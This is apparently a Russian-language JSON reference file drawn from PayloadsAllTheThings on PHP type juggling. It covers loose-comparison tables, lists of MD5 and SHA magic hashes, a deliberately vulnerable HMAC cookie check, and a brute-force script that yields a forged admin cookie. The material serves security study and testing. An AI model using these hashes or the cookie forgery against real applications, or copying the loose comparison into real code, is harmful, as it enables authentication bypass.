@@ -1,0 +1,167 @@
+{
+  "category": "Type Juggling",
+  "source": "PayloadsAllTheThings/Type Juggling/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое type juggling в PHP",
+      "language": "text",
+      "tags": ["methodology", "php", "type-juggling"],
+      "body": "PHP — слабо типизированный язык: он пытается угадать намерение программиста и автоматически приводит переменные к разным типам, когда считает это нужным. Например, строка, содержащая только цифры, может трактоваться как int или float.\n\nЭто автоматическое приведение (type juggling) даёт неожиданные результаты, особенно при сравнении через ==, которое проверяет только равенство значений (нестрогое сравнение), а не равенство типа И значения (строгое сравнение).\n\nГде искать: любой код, где атакующий контролирует одну из сравниваемых переменных — проверка паролей/токенов/HMAC, обход авторизации и аутентификации."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "== vs === — нестрогое и строгое сравнение",
+      "language": "text",
+      "tags": ["methodology", "php", "comparison"],
+      "body": "Нестрогое (loose) сравнение: == или != — обе переменные имеют «одинаковое значение».\nСтрогое (strict) сравнение: === или !== — обе переменные имеют «одинаковый тип И одинаковое значение».\n\nУязвимость type juggling возникает, когда используется нестрогое сравнение (== или !=) вместо строгого (=== или !==) в месте, где атакующий контролирует одну из сравниваемых переменных. Это может заставить приложение вернуть неверный ответ на true/false и привести к серьёзным багам авторизации и/или аутентификации."
+    },
+    {
+      "subcategory": "Слабое сравнение",
+      "title": "True Statements — выражения, дающие true при ==",
+      "language": "table",
+      "tags": ["loose-comparison", "php", "bypass"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Выражение", "Результат"],
+          "rows": [
+            ["'0010e2'   == '1e3'", "true"],
+            ["'0xABCdef' == ' 0xABCdef'", "true (PHP 5.0) / false (PHP 7.0)"],
+            ["'0xABCdef' == '     0xABCdef'", "true (PHP 5.0) / false (PHP 7.0)"],
+            ["'0x01'     == 1", "true (PHP 5.0) / false (PHP 7.0)"],
+            ["'0x1234Ab' == '1193131'", "true (PHP 5.0) / false (PHP 7.0)"],
+            ["'123'  == 123", "true"],
+            ["'123a' == 123", "true"],
+            ["'abc'  == 0", "true"],
+            ["'' == 0 == false == NULL", "true"],
+            ["'' == 0", "true"],
+            ["0  == false", "true"],
+            ["false == NULL", "true"],
+            ["NULL == ''", "true"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Слабое сравнение",
+      "title": "Таблица поведения PHP при нестрогих сравнениях (==)",
+      "language": "image",
+      "tags": ["loose-comparison", "php", "reference"],
+      "body": "",
+      "meta": {
+        "kind": "image",
+        "src": "/img/type-juggling/table_representing_behavior_of_PHP_with_loose_type_comparisons.png",
+        "caption": "Матрица результатов оператора == в PHP для пар значений (TRUE/FALSE, числа, \"0e1\", \"0e99\", \"2abc\", NULL, [], {} и т.д.). Серым подсвечены пары, дающие TRUE. Источник: PayloadsAllTheThings."
+      }
+    },
+    {
+      "subcategory": "Слабое сравнение",
+      "title": "NULL Statements — md5/sha1 от массива возвращают NULL",
+      "language": "table",
+      "tags": ["loose-comparison", "php", "null"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Функция", "Выражение", "Результат"],
+          "rows": [
+            ["sha1", "var_dump(sha1([]));", "NULL"],
+            ["md5", "var_dump(md5([]));", "NULL"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Слабое сравнение",
+      "title": "Нестрогие сравнения есть не только в PHP",
+      "language": "text",
+      "tags": ["loose-comparison", "reference"],
+      "body": "Нестрогие приведения типов при сравнении встречаются во многих языках/СУБД, не только в PHP. Готовые таблицы Loose-Compare-Tables (Hakumarachi) есть для:\n\nMariaDB, MySQL, NodeJS, PHP, Perl, Postgres, Python, SQLite.\n\nРепозиторий: github.com/Hakumarachi/Loose-Compare-Tables"
+    },
+    {
+      "subcategory": "Слабое сравнение",
+      "title": "PHP 8 — type juggling при сравнении строк с числами почти умер",
+      "language": "text",
+      "tags": ["loose-comparison", "php8", "mitigation"],
+      "body": "В PHP 8 строка больше не приводится к числу автоматически (RFC «Saner string to number comparisons») — коллизии с хэшами, начинающимися на 0e и подобными, наконец в прошлом.\n\nRFC «Consistent type errors for internal functions» убирает обходы вида 0 == strcmp($_GET['username'], $password): strcmp больше не возвращает null с warning, а бросает нормальное исключение.\n\nИтог: магические хэши и strcmp-трюки работают на PHP <= 7, на PHP 8 — нет."
+    },
+    {
+      "subcategory": "Magic Hashes",
+      "title": "Что такое магические хэши (0e...)",
+      "language": "text",
+      "tags": ["magic-hashes", "php", "md5"],
+      "body": "Магические хэши возникают из-за особенности type juggling в PHP при сравнении строкового хэша с числом. Если хэш-строка начинается с «0e», за которым идут только цифры, PHP интерпретирует её как научную нотацию (0 в степени N = 0) и при сравнении трактует как float 0.\n\nСледствие: два разных пароля, чьи md5/sha1 оба имеют вид 0e[только цифры], при нестрогом сравнении хэшей (==) окажутся «равны» нулю и друг другу. Это ломает проверки паролей/токенов, основанные на == вместо ===."
+    },
+    {
+      "subcategory": "Magic Hashes",
+      "title": "Таблица магических хэшей MD4 / MD5",
+      "language": "table",
+      "tags": ["magic-hashes", "md5", "md4"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Хэш", "«Магическое» число / строка", "Магический хэш", "Кем найдено / описание"],
+          "rows": [
+            ["MD4", "gH0nAdHk", "0e096229559581069251163783434175", "@spaze"],
+            ["MD4", "IiF+hTai", "00e90130237707355082822449868597", "@spaze"],
+            ["MD5", "240610708", "0e462097431906509019562988736854", "@spazef0rze"],
+            ["MD5", "QNKCDZO", "0e830400451993494058024219903391", "@spazef0rze"],
+            ["MD5", "0e1137126905", "0e291659922323405260514745084877", "@spazef0rze"],
+            ["MD5", "0e215962017", "0e291242476940776845150308577824", "@spazef0rze"],
+            ["MD5", "129581926211651571912466741651878684928", "06da5430449f8f6f23dfc1276f722738", "Raw: ?T0D??o#??'or'8.N=?"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Magic Hashes",
+      "title": "Таблица магических хэшей SHA1 / SHA-224 / SHA-256",
+      "language": "table",
+      "tags": ["magic-hashes", "sha1", "sha256"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Хэш", "«Магическое» число / строка", "Магический хэш", "Кем найдено / описание"],
+          "rows": [
+            ["SHA1", "10932435112", "0e07766915004133176347055865026311692244", "Michael A. Cleverly, Michele Spagnuolo & Rogdham"],
+            ["SHA-224", "10885164793773", "0e281250946775200129471613219196999537878926740638594636", "@TihanyiNorbert"],
+            ["SHA-256", "34250003024812", "0e46289032038065916139621039085883773413820991920706299695051332", "@TihanyiNorbert"],
+            ["SHA-256", "TyNOQHUS", "0e66298694359207596086558843543959518835691168370379069085300385", "@Chick3nman512"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Magic Hashes",
+      "title": "Коллизии магических хэшей (PHP) — var_dump",
+      "language": "php",
+      "tags": ["magic-hashes", "php", "collision"],
+      "body": "<?php\nvar_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)\nvar_dump(md5('aabg7XSs')  == md5('aabC9RqS'));\nvar_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));\nvar_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));\n?>"
+    },
+    {
+      "subcategory": "Обход аутентификации (HMAC)",
+      "title": "Уязвимый код — нестрогое сравнение HMAC из cookie",
+      "language": "php",
+      "tags": ["auth-bypass", "hmac", "php"],
+      "body": "function validate_cookie($cookie,$key){\n $hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);\n if($cookie['hmac'] != $hash){ // loose comparison\n  return false;\n  \n }\n else{\n  echo \"Well done\";\n }\n}"
+    },
+    {
+      "subcategory": "Обход аутентификации (HMAC)",
+      "title": "Логика обхода HMAC через 0e-хэш",
+      "language": "text",
+      "tags": ["auth-bypass", "hmac", "methodology"],
+      "body": "Уязвимость — в нестрогом сравнении (!=), которым $cookie['hmac'] проверяется против вычисленного $hash.\n\nЕсли атакующий контролирует $cookie['hmac'] и ставит его в строку \"0\", а также добивается, чтобы hash_hmac вернул хэш вида «0e» + только цифры (трактуется как 0), то условие $cookie['hmac'] != $hash станет false — проверка HMAC обойдена.\n\nКонтролируем 3 элемента cookie:\n• $username   — кого подделываем, обычно \"admin\"\n• $expiration — UNIX-таймстамп, должен быть в будущем\n• $hmac       — переданный хэш, \"0\"\n\nЭксплуатация:\n1. Готовим cookie: username = \"admin\", expiration = будущий таймстамп, hmac = \"0\".\n2. Брутфорсим $expiration, пока hash_hmac не выдаст хэш, начинающийся с \"0e\" и далее только цифры (\"нулеподобный\" хэш). Дорого по CPU и не всегда реально, но при успехе даёт обход.\n3. Подставляем найденное значение expiration в cookie. В примере ключ считался пустым: $key = '';"
+    },
+    {
+      "subcategory": "Обход аутентификации (HMAC)",
+      "title": "Брутфорс expiration до 0e-хэша + итоговый cookie",
+      "language": "php",
+      "tags": ["auth-bypass", "hmac", "bruteforce"],
+      "body": "// docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php\nfor($i=1424869663; $i < 1835970773; $i++ ){\n $out = hash_hmac('md5', 'admin|'.$i, '');\n if(str_starts_with($out, '0e' )){\n  if($out == 0){\n   echo \"$i - \".$out;\n   break;\n  }\n }\n}\n?>\n\n// Результат брутфорса: 1539805986 - 0e772967136366835494939987377058\n$cookie = [\n 'username' => 'admin',\n 'expiration' => 1539805986,\n 'hmac' => '0'\n];"
+    }
+  ]
+}
